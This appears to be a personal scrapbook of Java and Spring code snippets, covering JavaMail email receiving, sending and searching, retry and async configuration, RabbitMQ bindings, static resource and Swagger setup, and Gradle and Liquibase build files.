                String from = fromAddress[0].toString();
                String subject = msg.getSubject();
                String toList = parseAddresses(msg
                        .getRecipients(RecipientType.TO));
                String ccList = parseAddresses(msg
                        .getRecipients(RecipientType.CC));
                String sentDate = msg.getSentDate().toString();
 
                String contentType = msg.getContentType();
                String messageContent = "";
 
                if (contentType.contains("text/plain")
                        || contentType.contains("text/html")) {
                    try {
                        Object content = msg.getContent();
                        if (content != null) {
                            messageContent = content.toString();
                        }
                    } catch (Exception ex) {
                        messageContent = "[Error downloading content]";
                        ex.printStackTrace();
                    }
                }
 
                // print out details of each message
                System.out.println("Message #" + (i + 1) + ":");
                System.out.println("\t From: " + from);
                System.out.println("\t To: " + toList);
                System.out.println("\t CC: " + ccList);
                System.out.println("\t Subject: " + subject);
                System.out.println("\t Sent Date: " + sentDate);
                System.out.println("\t Message: " + messageContent);
            }
 
            // disconnect
            folderInbox.close(false);
            store.close();
        } catch (NoSuchProviderException ex) {
            System.out.println("No provider for protocol: " + protocol);
            ex.printStackTrace();
        } catch (MessagingException ex) {
            System.out.println("Could not connect to the message store");
            ex.printStackTrace();
        }
    }
 
    /**
     * Returns a list of addresses in String format separated by comma
     *
     * @param address an array of Address objects
     * @return a string represents a list of addresses
     */
    private String parseAddresses(Address[] address) {
        String listAddress = "";
 
        if (address != null) {
            for (int i = 0; i < address.length; i++) {
                listAddress += address[i].toString() + ", ";
            }
        }
        if (listAddress.length() > 1) {
            listAddress = listAddress.substring(0, listAddress.length() - 2);
        }
 
        return listAddress;
    }
 
    /**
     * Test downloading e-mail messages
     */
    public static void main(String[] args) {
        // for POP3
        //String protocol = "pop3";
        //String host = "pop.gmail.com";
        //String port = "995";
 
        // for IMAP
        String protocol = "imap";
        String host = "imap.gmail.com";
        String port = "993";
 
 
        String userName = "your_email_address";
        String password = "your_email_password";
 
        EmailReceiver receiver = new EmailReceiver();
        receiver.downloadEmails(protocol, host, port, userName, password);
    }
}
--------------------------------------------------------------------------------------------------------
@Configuration
@ComponentScan
@PropertySource( "classpath:application.properties" )
public class ApplicationContext {

  @Bean
  public FixedBackOffPolicy getBackOffPolicy( final Environment env ) {

    final FixedBackOffPolicy policy = new FixedBackOffPolicy();
    policy.setBackOffPeriod( Long.valueOf( env.getRequiredProperty( "retry.interval" ) ) );

    return policy;
  }

  @Bean
  public ExceptionClassifierRetryPolicy getRetryPolicy( final Environment env ) {

    final Map< Class< ? extends Throwable >, RetryPolicy > policyMap =
      new HashMap< Class< ? extends Throwable >, RetryPolicy >();

    final SimpleRetryPolicy simpleRetryPolicy = new SimpleRetryPolicy();
    simpleRetryPolicy.setMaxAttempts( Integer.valueOf( env.getRequiredProperty( "retry.count" ) ) );

    // Determine the policy per exception
    policyMap.put( ApplicationException.class, simpleRetryPolicy );

    final ExceptionClassifierRetryPolicy retryPolicy = new ExceptionClassifierRetryPolicy();
    retryPolicy.setPolicyMap( policyMap );

    return retryPolicy;
  }

  @Bean
  public WebServiceClientSimulation getWebServiceClient() {
    return new WebServiceClientSimulation();
  }
}
--------------------------------------------------------------------------------------------------------
import org.springframework.context.ApplicationContext;
import org.springframework.context.annotation.AnnotationConfigApplicationContext;
import org.springframework.integration.channel.DirectChannel;
import org.springframework.messaging.Message;
import org.springframework.messaging.MessageHandler;
import org.springframework.messaging.MessagingException;

public class Main {

    public static void main(String args[]) {

        ApplicationContext ac = new AnnotationConfigApplicationContext(ImapConfig.class);
        DirectChannel inputChannel = ac.getBean("messageChannel", DirectChannel.class);
        inputChannel.subscribe(new MessageHandler() {
            public void handleMessage(Message<?> message) throws MessagingException {

                System.out.println(message);

            }
        });
    }
}
--------------------------------------------------------------------------------------------------------
import com.sun.mail.smtp.SMTPMessage;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.stereotype.Component;

import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import java.io.IOException;
import java.util.Properties;

import static com.paragonsoftware.srs.parser.util.ParserUtils.getBody;
import static com.paragonsoftware.srs.parser.util.ParserUtils.getNullalbleSubject;

@Component
public class Sender {

    private static final Logger logger = LoggerFactory.getLogger(Sender.class);

    @Value("${mail.smtp.host}")
    private String host;
    @Value("${mail.smtp.port}")
    private int port;
    @Value("${support.abandoned}")
    private String supportAbandoned;

    private Properties getProperties() {
        Properties props = new Properties();
        props.put("mail.smtp.starttls.enable", "true");
        props.put("mail.smtp.auth", "false");
        props.put("mail.smtp.host", host);
        props.put("mail.smtp.port", port);
        props.put("mail.smtp.timeout", 5000);
        props.put("mail.smtp.connectiontimeout", 5000);
        props.put("mail.transport.protocol", "smtp");
        return props;
    }

    public boolean sendMail(Message msg) throws NullPointerException {
        logger.info("[SEND] SEND MAIL");

        Session session = Session.getInstance(getProperties());
        try {
            String from = ((InternetAddress) msg.getFrom()[0]).getAddress();
            String subject = getNullalbleSubject(msg);
            Message message = new SMTPMessage(session);
            message.setFrom(new InternetAddress(from));
            message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(supportAbandoned));
            message.setSubject(subject);
            message.setText(getBody(msg));
            Transport.send(message);
            logger.info("Sent message successfully....");
            return true;
        } catch (MessagingException mex) {
            logger.error("Error MessagingException in SEND MAIL", mex);
        } catch (NullPointerException npe) {
            logger.error("Error NullPointerException in SEND MAIL", npe);
            throw npe;
        } catch (IOException e) {
            logger.error("Error IOException in SEND MAIL", e);
        }

        return false;
    }

    public boolean sendErrorMail(Message msg) {
        logger.info("[SEND] SEND ERROR MAIL");

        Session session = Session.getInstance(getProperties());
        try {
            String from = ((InternetAddress) msg.getFrom()[0]).getAddress();
            String subject = getNullalbleSubject(msg);
            Message message = new SMTPMessage(session);
            message.setFrom(new InternetAddress(from));
            message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(supportAbandoned));
            message.setSubject(subject);

            message.setText("An error occured while reading message body. See 'with-errors' mailbox to find original email");

            Transport.send(message);
            logger.info("Sent error message successfully....");
            return true;
        } catch (MessagingException mex) {
            logger.error("Error MessagingException in SEND ERROR MAIL", mex);
        }
        return false;
    }
}
--------------------------------------------------------------------------------------------------------
			return Arrays.stream(messageArray)
					.filter(Objects::nonNull)
					.toArray(Message[]::new);
-------------------------------------------------------------------------------------------------------
List<String> valueList = new ArrayList<>();
valueList.add("Joe");
valueList.add("John");
valueList.add("Sean");
 
Stream<String> stream = valueList.stream();
stream.reduce((first, second) -> second)
  .orElse(null);
  
  
List<String> valueList = new ArrayList<String>();
valueList.add("Joe");
valueList.add("John");
valueList.add("Sean");
 
long count = valueList.stream().count();
Stream<String> stream = valueList.stream();
    
stream.skip(count - 1).findFirst().get();



Stream<Integer> stream = Stream.iterate(0, i -> i + 1);
stream.reduce((first, second) -> second).orElse(null);
--------------------------------------------------------------------------------------------------------
@Component
public class MessageReceiver {

    @StreamListener("SampleQueueA")
    public void onQueueAReceived(DemoMessage msg) {
        System.out.println("Message from A: "+msg);
    }

    @StreamListener("SampleQueueB")
    public void onQueueBReceived(DemoMessage msg) {
        System.out.println("Message from B: "+msg);
    }

}
and Having Simple Message Channel

[public interface MessageChannels {


    @Input("SampleQueueA")
    SubscribableChannel queueA();

    @Input("SampleQueueB")
    SubscribableChannel queueB();
}](url)
application.yml

spring:
  rabbitmq:
    host: 127.0.0.1
    virtual-host: /defaultVH
    username: guest
    password: guest
  cloud:
    stream:
      bindings:
        SampleQueueA:
          binder: rabbit-A
          contentType: application/x-java-object
          group: groupA
          destination: SampleQueueA
        SampleQueueB:
          binder: rabbit-B
          contentType: application/x-java-object
          group: groupB
          destination: SampleQueueB
      binders:
        rabbit-A:
          defaultCandidate: false
          inheritEnvironment: false
          type: rabbit
          environment:
            spring:
              rabbitmq:
                host: 127.0.0.1
                virtualHost: /vhA
                username: guest
                password: guest
                port: 5672
                connection-timeout: 10000
        rabbit-B:
          defaultCandidate: false
          inheritEnvironment: false
          type: rabbit
          environment:
            spring:
              rabbitmq:
                host: 127.0.0.1
                virtualHost: /vhB
                username: guest
                password: guest
                port: 5672
                connection-timeout: 10000
bootstrap.yml

############################################
# default settings
############################################
spring:
  main:
    banner-mode: "off"
  application:
    name: demo-service
  cloud:
    config:
      enabled: true #change this to use config-service
      retry:
        maxAttempts: 3
      discovery:
        enabled: false
      fail-fast: true
      override-system-properties: false

server:
  port: 8080
--------------------------------------------------------------------------------------------------------
@EnableZipkinStreamServer
@SpringBootApplication
public class ZipkinStreamServerApplication {
public static void main(String[] args) {
SpringApplication.run(ZipkinStreamServerApplication.class,args);
}
}
============↓ this is my application.properties===========
server.port=11020
spring.application.name=microservice-zipkin-stream-server
spring.sleuth.enabled=false
zipkin.storage.type=mysql
spring.datasource.schema[0]=classpath:/zipkin.sql
--------------------------------------------------------------------------------------------------------
@Configuration
@EnableAsync
public class SpringAsyncConfig implements AsyncConfigurer {
     
    @Override
    public Executor getAsyncExecutor() {
        return new ThreadPoolTaskExecutor();
    }    
}
public class CustomAsyncExceptionHandler
  implements AsyncUncaughtExceptionHandler {
 
    @Override
    public void handleUncaughtException(
      Throwable throwable, Method method, Object... obj) {
  
        System.out.println("Exception message - " + throwable.getMessage());
        System.out.println("Method name - " + method.getName());
        for (Object param : obj) {
            System.out.println("Parameter value - " + param);
        }
    }
}
--------------------------------------------------------------------------------------------------------
    private Properties getProperties() {
        Properties props = new Properties();
        props.put("mail.smtp.starttls.enable", "true");
        props.put("mail.smtp.auth", "false");
        props.put("mail.smtp.host", host);
        props.put("mail.smtp.port", port);
        props.put("mail.smtp.timeout", 5000);
        props.put("mail.smtp.connectiontimeout", 5000);
        props.put("mail.transport.protocol", "smtp");
        return props;
    }
--------------------------------------------------------------------------------------------------------
        Security.addProvider(new com.sun.net.ssl.internal.ssl.Provider());

        props.setProperty("mail.pop3.port", "995");
        props.setProperty("mail.pop3.socketFactory.port", "995");
        props.setProperty("mail.pop3.socketFactory.fallback", "false");
        props.setProperty("mail.pop3.connectiontimeout", "5000");
        props.setProperty("mail.pop3.timeout", "5000");
    }
--------------------------------------------------------------------------------------------------------
import java.util.Properties;

import javax.mail.Address;
import javax.mail.Message;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeMessage;


public class EmailSender {
    public EmailSender() {
    }

    public static void sendEmail( String to, String subject, String from, String content) throws Exception{
        Properties props = new Properties();
        props.setProperty("mail.transport.protocol", "smtp");
        props.setProperty("mail.host", "localhost"); 
        props.setProperty("mail.user", "coa-web"); 
        props.setProperty("mail.password", "");

        Session mailSession = Session.getDefaultInstance(props, null);
        Transport transport = mailSession.getTransport();

        MimeMessage message = new MimeMessage(mailSession);
        message.addFrom(new Address[] { new InternetAddress("coa-web@localhost",from)});  // the reply to email address and a logical descriptor of the sender of the email!

        message.setSubject(subject);
        message.setContent(content, "text/plain");
        message.addRecipient(Message.RecipientType.TO,
             new InternetAddress(to));

        transport.connect();
        transport.sendMessage(message,
            message.getRecipients(Message.RecipientType.TO));
        transport.close();
        }
        
        public static void main (String[] args) throws Exception {
            String content = "Some test content.";
            EmailSender.sendEmail("coa-backoffice@localhost","An interesting message","THE APP",content);
        }
   }
   
   package nl.amis.util;

import java.io.*;
import java.util.*;
import javax.mail.*;
import javax.mail.internet.*;

public class EmailClient  extends Authenticator
{
  public static final int SHOW_MESSAGES = 1;
  public static final int CLEAR_MESSAGES = 2;
  public static final int SHOW_AND_CLEAR =
    SHOW_MESSAGES + CLEAR_MESSAGES;
  
  protected String from;
  protected Session session;
  protected PasswordAuthentication authentication;
  
  public EmailClient(String user, String host)   {
    this(user, host, false);
  }
  
  public EmailClient(String user, String host, boolean debug)  {
    from = user + '@' + host;
    authentication = new PasswordAuthentication(user, user);
    Properties props = new Properties();
    props.put("mail.user", user);
    props.put("mail.host", host);
    props.put("mail.debug", debug ? "true" : "false");
    props.put("mail.store.protocol", "pop3");
    props.put("mail.transport.protocol", "smtp");
    session = Session.getInstance(props, this);
  }
  
  public PasswordAuthentication getPasswordAuthentication()  {
    return authentication;
  }
   
  public void checkInbox(int mode)
    throws MessagingException, IOException  {
    if (mode == 0) return;
    boolean show = (mode & SHOW_MESSAGES) > 0;
    boolean clear = (mode & CLEAR_MESSAGES) > 0;
    String action =
      (show ? "Show" : "") +
      (show && clear ? " and " : "") +
      (clear ? "Clear" : "");
    System.out.println(action + " INBOX for " + from);
    Store store = session.getStore();
    store.connect();
    Folder root = store.getDefaultFolder();
    Folder inbox = root.getFolder("Inbox");
    inbox.open(Folder.READ_WRITE);
    Message[] msgs = inbox.getMessages();
    if (msgs.length == 0 && show)
    {
      System.out.println("No messages in inbox");
    }
    for (int i = 0; i < msgs.length; i++)
    {
      MimeMessage msg = (MimeMessage)msgs[i];
      if (show)
      {
        System.out.println("    From: " + msg.getFrom()[0]);
        System.out.println(" Subject: " + msg.getSubject());
        System.out.println(" Content: " + msg.getContent());
      }
      if (clear)
      {
        msg.setFlag(Flags.Flag.DELETED, true);
      }
    }
    inbox.close(true);
    store.close();
    System.out.println();
  }
  public static void main(String[] args) throws Exception{
      // CREATE CLIENT INSTANCES
      EmailClient emailClient = new EmailClient("coa-backoffice", "localhost", false);
         
      // LIST MESSAGES FOR email client
      emailClient.checkInbox(EmailClient.SHOW_MESSAGES);
  }
}
--------------------------------------------------------------------------------------------------------
    @Bean()
    public ThreadPoolTaskScheduler taskScheduler(){
        ThreadPoolTaskScheduler taskScheduler = new ThreadPoolTaskScheduler();
        taskScheduler.setPoolSize(2);
        return  taskScheduler;
    }

    public static final Class<Void> TYPE = (Class<Void>) Class.getPrimitiveClass("void");
--------------------------------------------------------------------------------------------------------
Входящая почта
адрес почтового сервера — pop.yandex.ru;
защита соединения — SSL;
порт — 995.
Исходящая почта
адрес почтового сервера — smtp.yandex.ru;
защита соединения — SSL;
порт — 465.

Входящая почта
адрес почтового сервера — imap.yandex.ru;
защита соединения — SSL;
порт — 993.
Исходящая почта
адрес почтового сервера — smtp.yandex.ru;
защита соединения — SSL;
порт — 465.
--------------------------------------------------------------------------------------------------------
package net.codejava.mail;
 
import java.io.IOException;
import java.util.Date;
import java.util.Map;
import java.util.Properties;
import java.util.Set;
 
import javax.mail.Authenticator;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.Multipart;
import javax.mail.PasswordAuthentication;
import javax.mail.Session;
import javax.mail.Transport;
import javax.mail.internet.AddressException;
import javax.mail.internet.InternetAddress;
import javax.mail.internet.MimeBodyPart;
import javax.mail.internet.MimeMessage;
import javax.mail.internet.MimeMultipart;
 
/**
 * This utility class provides a functionality to send an HTML e-mail message
 * with embedded images.
 * @author www.codejava.net
 *
 */
public class EmbeddedImageEmailUtil {
 
    /**
     * Sends an HTML e-mail with inline images.
     * @param host SMTP host
     * @param port SMTP port
     * @param userName e-mail address of the sender's account
     * @param password password of the sender's account
     * @param toAddress e-mail address of the recipient
     * @param subject e-mail subject
     * @param htmlBody e-mail content with HTML tags
     * @param mapInlineImages
     *          key: Content-ID
     *          value: path of the image file
     * @throws AddressException
     * @throws MessagingException
     */
    public static void send(String host, String port,
            final String userName, final String password, String toAddress,
            String subject, String htmlBody,
            Map<String, String> mapInlineImages)
                throws AddressException, MessagingException {
        // sets SMTP server properties
        Properties properties = new Properties();
        properties.put("mail.smtp.host", host);
        properties.put("mail.smtp.port", port);
        properties.put("mail.smtp.auth", "true");
        properties.put("mail.smtp.starttls.enable", "true");
        properties.put("mail.user", userName);
        properties.put("mail.password", password);
 
        // creates a new session with an authenticator
        Authenticator auth = new Authenticator() {
            public PasswordAuthentication getPasswordAuthentication() {
                return new PasswordAuthentication(userName, password);
            }
        };
        Session session = Session.getInstance(properties, auth);
 
        // creates a new e-mail message
        Message msg = new MimeMessage(session);
 
        msg.setFrom(new InternetAddress(userName));
        InternetAddress[] toAddresses = { new InternetAddress(toAddress) };
        msg.setRecipients(Message.RecipientType.TO, toAddresses);
        msg.setSubject(subject);
        msg.setSentDate(new Date());
 
        // creates message part
        MimeBodyPart messageBodyPart = new MimeBodyPart();
        messageBodyPart.setContent(htmlBody, "text/html");
 
        // creates multi-part
        Multipart multipart = new MimeMultipart();
        multipart.addBodyPart(messageBodyPart);
 
        // adds inline image attachments
        if (mapInlineImages != null && mapInlineImages.size() > 0) {
            Set<String> setImageID = mapInlineImages.keySet();
             
            for (String contentId : setImageID) {
                MimeBodyPart imagePart = new MimeBodyPart();
                imagePart.setHeader("Content-ID", "<" + contentId + ">");
                imagePart.setDisposition(MimeBodyPart.INLINE);
                 
                String imageFilePath = mapInlineImages.get(contentId);
                try {
                    imagePart.attachFile(imageFilePath);
                } catch (IOException ex) {
                    ex.printStackTrace();
                }
 
                multipart.addBodyPart(imagePart);
            }
        }
 
        msg.setContent(multipart);
 
        Transport.send(msg);
    }
}

package net.codejava.mail;
 
import java.util.HashMap;
import java.util.Map;
 
/**
 * This program tests out the EmbeddedImageEmailUtil utility class.
 * @author www.codejava.net
 *
 */
public class InlineImageEmailTester {
 
    /**
     * main entry of the program
     */
    public static void main(String[] args) {
        // SMTP info
        String host = "smtp.gmail.com";
        String port = "587";
        String mailFrom = "YOUR_EMAIL";
        String password = "YOUR_PASSWORD";
 
        // message info
        String mailTo = "YOUR_RECIPIENT";
        String subject = "Test e-mail with inline images";
        StringBuffer body
            = new StringBuffer("<html>This message contains two inline images.<br>");
        body.append("The first image is a chart:<br>");
        body.append("<img src=\"cid:image1\" width=\"30%\" height=\"30%\" /><br>");
        body.append("The second one is a cube:<br>");
        body.append("<img src=\"cid:image2\" width=\"15%\" height=\"15%\" /><br>");
        body.append("End of message.");
        body.append("</html>");
 
        // inline images
        Map<String, String> inlineImages = new HashMap<String, String>();
        inlineImages.put("image1", "E:/Test/chart.png");
        inlineImages.put("image2", "E:/Test/cube.jpg");
 
        try {
            EmbeddedImageEmailUtil.send(host, port, mailFrom, password, mailTo,
                subject, body.toString(), inlineImages);
            System.out.println("Email sent.");
        } catch (Exception ex) {
            System.out.println("Could not send email.");
            ex.printStackTrace();
        }
    }
}
--------------------------------------------------------------------------------------------------------
private static final String[] CLASSPATH_RESOURCE_LOCATIONS = {
		"classpath:/META-INF/resources/", "classpath:/resources/",
		"classpath:/static/", "classpath:/public/" };
		
@Override
public void addResourceHandlers(ResourceHandlerRegistry registry) {
	if (!registry.hasMappingForPattern("/webjars/**")) {
		registry.addResourceHandler("/webjars/**").addResourceLocations(
				"classpath:/META-INF/resources/webjars/");
	}
	if (!registry.hasMappingForPattern("/**")) {
		registry.addResourceHandler("/**").addResourceLocations(
				RESOURCE_LOCATIONS);
	}
}

   @Override
   public void addResourceHandlers(ResourceHandlerRegistry registry) {

      // Register resource handler for CSS and JS
      registry.addResourceHandler("/resources/**").addResourceLocations("classpath:/statics/", "D:/statics/")
            .setCacheControl(CacheControl.maxAge(2, TimeUnit.HOURS).cachePublic());

      // Register resource handler for images
      registry.addResourceHandler("/images/**").addResourceLocations("/WEB-INF/images/")
            .setCacheControl(CacheControl.maxAge(2, TimeUnit.HOURS).cachePublic());
   }
--------------------------------------------------------------------------------------------------------
@Service
class InternalRequestRewriteFilter(
        @Value("\${server.servlet.context-path}") private val contextPath: String): WebFilter {
    private val pathMatcher = AntPathMatcher()
    private val swaggerPaths = setOf("swagger-ui.html", "webjars/springfox-*/**", "swagger-resources/**", "v2/api-docs")
    private val logger = getLogger(javaClass)

    override fun filter(exchange: ServerWebExchange, chain: WebFilterChain): Mono<Void> {
        // Get the path of the request
        val path = exchange.request.path.pathWithinApplication().value()
        // If the path leads to an swagger element -> remove the context path for the internal processing
        val modifiedExchange = if (isSwaggerRequest(exchange.request)) {
            logger.debug("""Swagger request detected for path "$path"""")
            exchange.mutate().request(exchange.request.mutate().path(path.replaceFirst(contextPath, "")).build()).build()
        } else {
            exchange
        }
        // Execute the normal filter chain
        return chain.filter(modifiedExchange)
    }

    private fun isSwaggerRequest(request: ServerHttpRequest): Boolean {
        // Get the path of the request
        val path = request.path.pathWithinApplication().value()

        return swaggerPaths.any {swaggerPath -> pathMatcher.match("$contextPath/$swaggerPath", path)}
    }
}
--------------------------------------------------------------------------------------------------------
String ResultString = null;

Pattern regex = Pattern.compile("^.*\\\\", Pattern.CASE_INSENSITIVE | Pattern.UNICODE_CASE);
Matcher regexMatcher = regex.matcher(subjectString);
if (regexMatcher.find()) {
	ResultString = regexMatcher.group();
--------------------------------------------------------------------------------------------------------
@EnableAutoConfiguration
public class ReplaceDefaultLocationsExample {

    public static void main (String[] args) {

        SpringApplication app =
                  new SpringApplication(ReplaceDefaultLocationsExample.class);

        Properties properties = new Properties();
        properties.setProperty("spring.resources.static-locations",
                          "classpath:/newLocation1/, classpath:/newLocation2/");
        app.setDefaultProperties(properties);
        app.run(args);
    }
}
--------------------------------------------------------------------------------------------------------
package com.javacodegeeks.snippets.enterprise;
 
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
 
import org.springframework.web.servlet.ModelAndView;
import org.springframework.web.servlet.mvc.AbstractController;
 
public class HelloWorldController extends AbstractController{
 
    @Override
    protected ModelAndView handleRequestInternal(HttpServletRequest request,
            HttpServletResponse response) throws Exception {
 
        ModelAndView model = new ModelAndView("helloWorld");
        model.addObject("msg", "hello world!");
         
        return model;
    }
         
}
--------------------------------------------------------------------------------------------------------
    @Bean
    WebMvcConfigurer configurer () {
        return new WebMvcConfigurerAdapter() {
            @Override
            public void addResourceHandlers (ResourceHandlerRegistry registry) {
                registry.addResourceHandler("/pages/**").
                          addResourceLocations("classpath:/my-custom-location/");
            }
        };
    }
--------------------------------------------------------------------------------------------------------
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xmlns:th="http://www.thymeleaf.org">
<head>
  <meta charset="UTF-8">
  <title>Rest Doc</title>
  <link rel="stylesheet" type="text/css" href="https://raw.githubusercontent.com/swagger-api/swagger-ui/master/dist/swagger-ui.css"
        th:href="@{/webjars/swagger-ui/3.0.17/swagger-ui.css}">
</head>
<body>

<div id="swagger-ui"></div>

<script src="https://raw.githubusercontent.com/swagger-api/swagger-ui/master/dist/swagger-ui-bundle.js"
        th:src="@{/webjars/swagger-ui/3.0.17/swagger-ui-bundle.js}">
</script>
<script src="https://raw.githubusercontent.com/swagger-api/swagger-ui/master/dist/swagger-ui-standalone-preset.js"
        th:src="@{/webjars/swagger-ui/3.0.17/swagger-ui-standalone-preset.js}"></script>
<script>
  window.onload = function () {

    // Build a system
    window.ui = SwaggerUIBundle({
      url: "/v2/api-docs",
      dom_id: '#swagger-ui',
      presets: [
        SwaggerUIBundle.presets.apis,
        SwaggerUIStandalonePreset
      ],
      plugins: [
        SwaggerUIBundle.plugins.DownloadUrl
      ],
      layout: "StandaloneLayout"
    })
  }
</script>
</body>
</html>
--------------------------------------------------------------------------------------------------------
package net.codejava.mail;
 
import javax.mail.Address;
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.search.SearchTerm;
 
public class FromFieldSearchTerm extends SearchTerm {
    private String fromEmail;
     
    public FromFieldSearchTerm(String fromEmail) {
        this.fromEmail = fromEmail;
    }
     
    @Override
    public boolean match(Message message) {
        try {
            Address[] fromAddress = message.getFrom();
            if (fromAddress != null && fromAddress.length > 0) {
                if (fromAddress[0].toString().contains(fromEmail)) {
                    return true;
                }
            }
        } catch (MessagingException ex) {
            ex.printStackTrace();
        }
         
        return false;
    }
     
}

package net.codejava.mail;
 
import java.util.Date;
 
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.search.SearchTerm;
 
public class SentDateSearchTerm extends SearchTerm {
    private Date afterDate;
     
    public SentDateSearchTerm(Date afterDate) {
        this.afterDate = afterDate;
    }
     
    @Override
    public boolean match(Message message) {
        try {
            if (message.getSentDate().after(afterDate)) {
                return true;
            }
        } catch (MessagingException ex) {
            ex.printStackTrace();
        }
        return false;
    }
 
}

package net.codejava.mail;
 
import java.io.IOException;
 
import javax.mail.Message;
import javax.mail.MessagingException;
import javax.mail.search.SearchTerm;
 
public class ContentSearchTerm extends SearchTerm {
    private String content;
     
    public ContentSearchTerm(String content) {
        this.content = content;
    }
     
    @Override
    public boolean match(Message message) {
        try {
            String contentType = message.getContentType().toLowerCase();
            if (contentType.contains("text/plain")
                    || contentType.contains("text/html")) {
                String messageContent = message.getContent().toString();
                if (messageContent.contains(content)) {
                    return true;
                }
            }
        } catch (MessagingException ex) {
            ex.printStackTrace();
        } catch (IOException ex) {
            ex.printStackTrace();
        }
        return false;
    }
 
}

SearchTerm term = new SearchTerm() {
    public boolean match(Message message) {
        try {
            if (message.getSubject().contains("Java")) {
                return true;
            }
        } catch (MessagingException ex) {
            ex.printStackTrace();
        }
        return false;
    }
};
--------------------------------------------------------------------------------------------------------
spring.data.web.pageable.size-parameter=size
spring.data.web.pageable.page-parameter=page
spring.data.web.pageable.default-page-size=10
spring.data.web.pageable.one-indexed-parameters=false
spring.data.web.pageable.max-page-size=2000
spring.data.web.pageable.prefix=
spring.data.web.pageable.qualifier-delimiter=_

	@GetMapping(path = "/characters/page")
	Page<MovieCharacter> loadCharactersPage(
			@PageableDefault(page = 0, size = 20)
			@SortDefault.SortDefaults({
					@SortDefault(sort = "name", direction = Sort.Direction.DESC),
					@SortDefault(sort = "id", direction = Sort.Direction.ASC)
			})
		Pageable pageable) {
		return characterRepository.findAllPage(pageable);
	}
--------------------------------------------------------------------------------------------------------
@ResponseBody
@RequestMapping(value="/upload/", method=RequestMethod.POST, 
        produces = "text/plain")
public String uploadFile(MultipartHttpServletRequest request) 
        throws IOException {

  Iterator<String> itr = request.getFileNames();

  MultipartFile file = request.getFile(itr.next());
  MultiValueMap<String, Object> parts = 
          new LinkedMultiValueMap<String, Object>();
  parts.add("file", new ByteArrayResource(file.getBytes()));
  parts.add("filename", file.getOriginalFilename());

  RestTemplate restTemplate = new RestTemplate();
  HttpHeaders headers = new HttpHeaders();
  headers.setContentType(MediaType.MULTIPART_FORM_DATA);

  HttpEntity<MultiValueMap<String, Object>> requestEntity =
          new HttpEntity<MultiValueMap<String, Object>>(parts, headers);

  // file upload path on destination server
  parts.add("destination", "./");

  ResponseEntity<String> response =
          restTemplate.exchange("http://localhost:8080/pi", 
                  HttpMethod.POST, requestEntity, String.class);

  if (response != null && !response.getBody().trim().equals("")) {
    return response.getBody();
  }

  return "error";
}

curl --form file=@test.dat localhost:8080/upload/
--------------------------------------------------------------------------------------------------------
@Service
public class MyService {
 
  @Retryable(value = {FooException.class, BarException.class}, maxAttempts = 5)
  public void retryWithException() {
    // perform operation that is likely to fail
  }
 
  @Recover
  public void recover(FooException exception) {
    // recover from FooException
  }
}
--------------------------------------------------------------------------------------------------------
final BusinessOperation<String> op = new Retry<>(
    new FindCustomer(
        "1235",
        new CustomerNotFoundException("not found"),
        new CustomerNotFoundException("still not found"),
        new CustomerNotFoundException("don't give up yet!")
    ),
    5,
    100,
    e -> CustomerNotFoundException.class.isAssignableFrom(e.getClass())
);
--------------------------------------------------------------------------------------------------------
@PostConstruct
public void postConstruct(){
  logger.info("SECURITY MODULE LOADED!");
}
  
  
import org.springframework.boot.context.properties.ConfigurationPropertiesBinding;
import org.springframework.boot.context.properties.EnableConfigurationProperties;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

@Configuration
@EnableConfigurationProperties(MailModuleProperties.class)
class MailModuleConfiguration {

	@Bean
	@ConfigurationPropertiesBinding
	public WeightConverter weightConverter() {
		return new WeightConverter();
	}

}

@DeprecatedConfigurationProperty(reason = "not needed anymore", replacement = "none")
public String getDefaultSubject() {
  return defaultSubject;
}
--------------------------------------------------------------------------------------------------------
@Test
public void givenListOfCustomers_whenTransformed_thenListOfAddress() {
    Collection<Address> addressCol = CollectionUtils.collect(list1, 
      new Transformer<Customer, Address>() {
        public Address transform(Customer customer) {
            return customer.getAddress();
        }
    });
     
    List<Address> addressList = new ArrayList<>(addressCol);
    assertTrue(addressList.size() == 3);
    assertTrue(addressList.get(0).getLocality().equals("locality1"));
}
@Test
public void givenCustomerList_WhenFiltered_thenCorrectSize() {
     
    boolean isModified = CollectionUtils.filter(linkedList1, 
      new Predicate<Customer>() {
        public boolean evaluate(Customer customer) {
            return Arrays.asList("Daniel","Kyle").contains(customer.getName());
        }
    });
      
    assertTrue(linkedList1.size() == 2);
}

--------------------------------------------------------------------------------------------------------
	ext {
		springBootVersion = '1.5.4.RELEASE'
	}
	repositories {
		mavenCentral()
	}
	dependencies {
		classpath("org.springframework.boot:spring-boot-gradle-plugin:${springBootVersion}")
	}
}

apply plugin: 'java'
apply plugin: 'eclipse'
apply plugin: 'org.springframework.boot'

version = '0.0.1-SNAPSHOT'
sourceCompatibility = 11

repositories {
	mavenLocal()
	mavenCentral()
}

dependencies {
	compile('org.springframework.boot:spring-boot-starter-web')
	compile project(':spring-boot:modular:security-module')
	compile project(':spring-boot:modular:booking-module')
	testCompile('org.springframework.boot:spring-boot-starter-test')
}

bootRun{
	jvmArgs = ["-Xdebug", "-Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=5006"]
	systemProperties = System.properties
}
--------------------------------------------------------------------------------------------------------
## db.changelog-master.yaml

databaseChangeLog:
- preConditions:
  - runningAs:
      username: sa

- changeSet:
    id: 1
    author: hombergs
    changes:
    - createTable:
        tableName: booking
        columns:
        - column:
            name: id
            type: bigint
            autoIncrement: true
            constraints:
              primaryKey: true
              nullable: false
        - column:
            name: customer_id
            type: bigint
        - column:
            name: flight_number
            type: varchar(50)
            constraints:
              nullable: false

- changeSet:
    id: 2
    author: hombergs
    changes:
    - createTable:
        tableName: customer
        columns:
        - column:
            name: id
            type: bigint
            autoIncrement: true
            constraints:
              primaryKey: true
              nullable: false
        - column:
            name: name
            type: varchar(50)
            constraints:
              nullable: false
